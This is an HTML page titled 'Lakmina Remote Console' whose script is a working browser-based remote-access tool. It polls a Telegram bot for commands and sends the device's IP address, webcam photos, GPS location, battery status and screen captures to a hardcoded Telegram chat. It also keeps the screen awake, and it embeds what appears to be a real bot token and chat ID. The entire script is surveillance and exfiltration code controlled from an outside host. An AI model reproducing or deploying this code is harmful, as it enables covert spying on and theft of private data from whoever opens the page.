<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lakmina Remote Console</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        .box { border: 1px solid #0f0; padding: 20px; margin-top: 30vh; display: inline-block; box-shadow: 0 0 15px #0f0; }
        .blink { animation: blinker 1s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="initSystem()">

    <div class="box">
        <h2>LAKMINA CONTROL v2.0</h2>
        <p id="status">STATUS: [ WAITING FOR INITIAL TOUCH ]</p>
        <p class="blink">● SYSTEM LISTENING</p>
    </div>

    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
        const CHAT_ID = '7883989086';
        let lastId = 0;

        // ස්ක්‍රීන් එක ඕෆ් වීම වැළැක්වීම (Wake Lock)
        async function initSystem() {
            document.getElementById('status').innerText = "STATUS: [ SYSTEM FULLY ARMED ]";
            document.getElementById('status').style.color = "#0f0";
            if ('wakeLock' in navigator) {
                try { await navigator.wakeLock.request('screen'); } catch (err) {}
            }
            sendText("✅ System fully armed and connected to PC.");
        }

        async function poll() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastId + 1}`);
                const d = await r.json();
                if (d.result.length > 0) {
                    for (let u of d.result) {
                        lastId = u.update_id;
                        let cmd = u.message.text.toLowerCase();

                        if (cmd === 'ip') getIP();
                        if (cmd === 'photo') takePhoto();
                        if (cmd === 'location') getLocation();
                        if (cmd === 'battery') getBattery();
                        if (cmd === 'screen') takeScreenshot(); // ස්ක්‍රීන් එක ගන්න
                    }
                }
            } catch (e) {}
        }

        async function getIP() {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            sendText("📍 IP: " + d.ip);
        }

        function getBattery() {
            navigator.getBattery().then(b => {
                sendText(`🔋 Battery: ${b.level * 100}% | Charging: ${b.charging}`);
            });
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${p.coords.latitude}&longitude=${p.coords.longitude}`);
            });
        }

        async function takePhoto() {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = s;
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => {
                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 'c.png');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
                    s.getTracks().forEach(t => t.stop());
                });
            }, 1000);
        }

        // ස්ක්‍රීන් එකේ Frame එකක් ගැනීමට උත්සාහ කිරීම
        async function takeScreenshot() {
            try {
                const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = s.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                const canvas = document.getElementById('c');
                canvas.width = bitmap.width; canvas.height = bitmap.height;
                canvas.getContext('2d').drawImage(bitmap, 0, 0);
                canvas.toBlob(b => {
                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 's.png');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
                    track.stop();
                });
            } catch (e) { sendText("Screen Capture Error: " + e.message); }
        }

        function sendText(t) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
        }

        setInterval(poll, 3000);
    </script>
</body>
</html>
